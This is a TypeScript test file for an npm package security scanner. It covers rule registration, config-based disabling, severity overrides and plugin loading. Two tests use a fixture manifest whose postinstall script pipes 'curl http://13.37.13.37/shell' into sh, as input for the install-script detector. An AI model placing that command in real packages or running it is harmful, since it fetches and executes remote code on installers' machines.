import { describe, it, afterEach } from "node:test";
import assert from "node:assert/strict";
import os from "node:os";
import path from "node:path";
import fs from "node:fs";

import { NpmSafeEngine } from "../src/index.js";
import { StaticAnalyzer } from "../src/scanner/static-rules.js";
import { RuleConfigManager } from "../src/scanner/rule-config.js";
import { FindingCategory, Severity } from "../src/scanner/types.js";

function tmpFile(prefix: string): string {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), `npm-safe-${prefix}-`));
  return path.join(dir, `${prefix}.db`);
}

describe("StaticAnalyzer rule registration", () => {
  it("registers and unregisters rules at runtime", () => {
    const analyzer = new StaticAnalyzer([]);
    const rule = {
      id: "custom-rule",
      name: "Custom",
      description: "d",
      severity: Severity.High,
      category: FindingCategory.Informational,
      enabled: true,
      match: () => [
        {
          ruleId: "custom-rule",
          ruleName: "Custom",
          severity: Severity.High,
          message: "custom hit",
          category: FindingCategory.Informational,
        },
      ],
    };

    assert.strictEqual(analyzer.listRules().length, 0);
    analyzer.registerRule(rule);
    assert.strictEqual(analyzer.listRules().length, 1);
    assert.strictEqual(analyzer.listRules()[0].source, "plugin");

    const report = analyzer.analyze("", { name: "pkg", version: "1.0.0" });
    assert.strictEqual(report.findings.length, 1);
    assert.strictEqual(report.findings[0].ruleId, "custom-rule");

    assert.strictEqual(analyzer.unregisterRule("custom-rule"), true);
    assert.strictEqual(analyzer.listRules().length, 0);
    assert.strictEqual(analyzer.unregisterRule("custom-rule"), false);
  });

  it("replaces a rule with the same id", () => {
    const analyzer = new StaticAnalyzer();
    const before = analyzer.listRules().find((r) => r.id === "typosquatting");
    assert.ok(before);
    const replacement = {
      id: "typosquatting",
      name: "Typosquatting v2",
      description: "d",
      severity: Severity.Low,
      category: FindingCategory.Typosquatting,
      enabled: true,
      match: () => [],
    };
    analyzer.registerRule(replacement);
    const after = analyzer.listRules().find((r) => r.id === "typosquatting");
    assert.strictEqual(after?.severity, Severity.Low);
  });
});

describe("Rule config overrides in StaticAnalyzer", () => {
  it("disables a rule via config", () => {
    const config = new RuleConfigManager(
      path.join(fs.mkdtempSync(path.join(os.tmpdir(), "rc-")), "rules.json"),
    );
    config.setEnabled("install-script", false);
    const analyzer = new StaticAnalyzer(undefined, config);

    const report = analyzer.analyze("", {
      name: "evil",
      version: "1.0.0",
      scripts: { postinstall: "curl http://13.37.13.37/shell | sh" },
    });
    assert.strictEqual(report.findings.length, 0);
    const descriptor = analyzer.listRules().find((r) => r.id === "install-script");
    assert.strictEqual(descriptor?.enabled, false);
  });

  it("overrides finding severity via config", () => {
    const config = new RuleConfigManager(
      path.join(fs.mkdtempSync(path.join(os.tmpdir(), "rc-")), "rules.json"),
    );
    config.setSeverity("install-script", Severity.Medium);
    const analyzer = new StaticAnalyzer(undefined, config);

    const report = analyzer.analyze("", {
      name: "evil",
      version: "1.0.0",
      scripts: { postinstall: "curl http://13.37.13.37/shell | sh" },
    });
    const finding = report.findings.find((f) => f.ruleId === "install-script");
    assert.ok(finding);
    assert.strictEqual(finding.severity, Severity.Medium);
    const descriptor = analyzer.listRules().find((r) => r.id === "install-script");
    assert.strictEqual(descriptor?.severity, Severity.Medium);
  });
});

describe("NpmSafeEngine rule API", () => {
  let engine: NpmSafeEngine;

  afterEach(() => {
    engine?.close();
  });

  it("exposes rule list and register/unregister", async () => {
    engine = new NpmSafeEngine({
      dbPath: tmpFile("engine"),
      rulesConfigPath: path.join(fs.mkdtempSync(path.join(os.tmpdir(), "ec-")), "rules.json"),
      rulesDir: path.join(os.tmpdir(), "no-such-rules-dir"),
    });

    const builtin = engine.listRules().filter((r) => r.source === "builtin");
    assert.strictEqual(builtin.length, 10);

    engine.registerRule({
      id: "engine-custom",
      name: "Engine Custom",
      description: "d",
      severity: Severity.Low,
      category: FindingCategory.Informational,
      enabled: true,
      match: () => [],
    });
    assert.ok(engine.listRules().some((r) => r.id === "engine-custom"));
    assert.strictEqual(engine.unregisterRule("engine-custom"), true);
  });

  it("persists rule enable/disable and reflects it in listRules", async () => {
    engine = new NpmSafeEngine({
      dbPath: tmpFile("engine2"),
      rulesConfigPath: path.join(fs.mkdtempSync(path.join(os.tmpdir(), "ec2-")), "rules.json"),
      rulesDir: path.join(os.tmpdir(), "no-such-rules-dir"),
    });

    engine.setRuleEnabled("install-script", false);
    const descriptor = engine.listRules().find((r) => r.id === "install-script");
    assert.strictEqual(descriptor?.enabled, false);

    engine.setRuleEnabled("install-script", true);
    const after = engine.listRules().find((r) => r.id === "install-script");
    assert.strictEqual(after?.enabled, true);
  });

  it("loads plugin rules from a directory", async () => {
    const rulesDir = fs.mkdtempSync(path.join(os.tmpdir(), "plugins-"));
    fs.writeFileSync(
      path.join(rulesDir, "plugin.mjs"),
      `export const rule = {
        id: "dir-plugin",
        name: "Dir Plugin",
        description: "d",
        severity: "high",
        category: "informational",
        enabled: true,
        match: () => [],
      };`,
      "utf8",
    );

    engine = new NpmSafeEngine({
      dbPath: tmpFile("engine3"),
      rulesConfigPath: path.join(fs.mkdtempSync(path.join(os.tmpdir(), "ec3-")), "rules.json"),
      rulesDir,
    });
    await new Promise((r) => setTimeout(r, 50));
    assert.ok(engine.listRules().some((r) => r.id === "dir-plugin"));
  });
});
